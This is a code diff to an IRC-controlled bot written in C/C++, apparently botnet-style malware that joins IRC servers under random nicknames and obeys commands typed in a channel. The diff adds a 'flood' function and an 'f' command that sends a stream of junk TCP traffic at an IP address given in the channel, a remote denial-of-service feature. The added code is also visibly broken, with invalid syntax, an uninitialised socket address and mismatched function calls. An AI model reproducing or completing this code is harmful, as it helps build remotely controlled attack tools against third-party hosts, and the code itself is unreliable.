@@ -30,7 +30,23 @@ char ChanPass[] = "pass";
 int Sock;
 bool Connected;
 
-char *GenerateLetterNick(int Len, int Sock) {
+void flood(char* addr, int count) {
+	int sock, i = 0;
+	sockaddr *sa;
+	char buf = [MAX_LINE_SIZE];
+	sa->sa_family = AF_INET;
+	sa->sa_data = *addr;
+	memset(buf, 1, sizeof(buf));
+	do sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+	while (sock < 0);
+	while (connect(SOCK_STREAM, sa, sizeof(addr)))continue;
+	while (i < count * 100) {
+		send(sock, buf, strlen(buf), 0);
+		i++;
+	}
+}
+
+char *GenerateLetterNick(int Len) {
 
 	int r, i;
 	char Buffer[] = "abcdefghijklmnopqrstuvwxyz0123456789_-[]^`|{}";
@@ -124,6 +140,8 @@ int Irc_Parse_Command(char *CurrentChannel, char *Line)
 
 		//Reconnect, next server
 		else if (strcmp(a[0], "q") == 0)
+		
+		
 		{
 			snprintf(Buffer, sizeof(Buffer), "%s\r\n", "QUIT");
 			send(Sock, Buffer, strlen(Buffer), 0);
@@ -135,7 +153,7 @@ int Irc_Parse_Command(char *CurrentChannel, char *Line)
 		else if (strcmp(a[0], "n") == 0)
 		{
 			if (a[x+1] != NULL) snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", a[x+1]);
-			else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen, Sock));
+			else snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen));
 			send(Sock, Buffer, strlen(Buffer), 0);
 			memset(Buffer, 0, sizeof(Buffer));
 			return 1;
@@ -162,6 +180,18 @@ int Irc_Parse_Command(char *CurrentChannel, char *Line)
 			return 1;
 		}
 
+		//flood an ip
+		else if (strcmp(a[0], "f") == 0){
+			if (strcmp(a[1], NULL) == 1 && strcmp(a[2], NULL) == 1) {
+				if (inet_addr(a[1]) != INADDR_NONE) {
+					int a;
+					try a = std::stoi(a[2]);
+					catch return -4;
+					flood(a);
+				}
+			}
+		}
+
 		else if (a[x+2] == NULL) return 1;
 
 
@@ -177,14 +207,14 @@ int Irc_Parse_Command(char *CurrentChannel, char *Line)
 }
 
 
-int Irc_Connect(char *Server, unsigned int Port, bool UsePassword, const char *Password) {
+int Irc_Connect(char *Server, unsigned int Port, bool UsePassword, const char *Password) {//обработка return-а
 
-    sockaddr_in Peer;
+    //sockaddr_in Peer;
 
 	char Buffer[MAX_LINE_SIZE], Nick[MAX_NICK_SIZE], name[MAX_NICK_SIZE];
 
-	Peer.sin_family = AF_INET;
-	Peer.sin_port = htons(Port);
+	//Peer.sin_family = AF_INET;
+	//Peer.sin_port = htons(Port);
 
 	Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	if (Sock < 0) {
@@ -198,7 +228,7 @@ int Irc_Connect(char *Server, unsigned int Port, bool UsePassword, const char *P
 		send(Sock, Buffer, strlen(Buffer), 0);
 	}
 
-	sprintf(Nick, GenerateLetterNick(NickLen, Sock));
+	sprintf(Nick, GenerateLetterNick(NickLen));
 	sprintf(Buffer, "%s %s\r\n", "NICK", Nick);
 
 	if (send(Sock, Buffer, strlen(Buffer), 0) < 0) {
@@ -206,7 +236,7 @@ int Irc_Connect(char *Server, unsigned int Port, bool UsePassword, const char *P
 		printf("Failed to send NICK!\n");
 		return 0;
 	}
-	sprintf(name, "%s", GenerateLetterNick(0, 0));
+	sprintf(name, "%s", GenerateLetterNick(0));
 	sprintf(Buffer, "%s %s \"fo%d.net\" \"lol\" :%s\r\n", "PASS", name, rand()%10, name);
 
 	printf("Sending: %s\n", Buffer);
@@ -274,7 +304,7 @@ int Irc_Parse(char *Line)
 	//Nick already in use
 	else if (strcmp(w[1], "433") == 0)
 	{
-		snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen, Sock));
+		snprintf(Buffer, sizeof(Buffer), "%s %s\r\n", "NICK", GenerateLetterNick(NickLen));
 
 		if (send(Sock, Buffer, strlen(Buffer), 0) < 0)return -1;
 		else return 1;
@@ -339,7 +369,7 @@ int main()
 	char Buffer[RECV_BUFFER_SIZE];
 	int Error = 0, len;
 	struct timeval tv;
-	fd_set fds;
+	//fd_set fds;
 	int nRetVal;
 
 	Connected = 0;
@@ -359,8 +389,8 @@ int main()
 			Connected = 1;
 			while (Sock > 0)
 			{
-				FD_ZERO(&fds);
-				FD_SET(Sock, &fds);
+				//FD_ZERO(&fds);
+				//FD_SET(Sock, &fds);
 
 				len = 0;
 				memset(Buffer, 0, sizeof(Buffer));
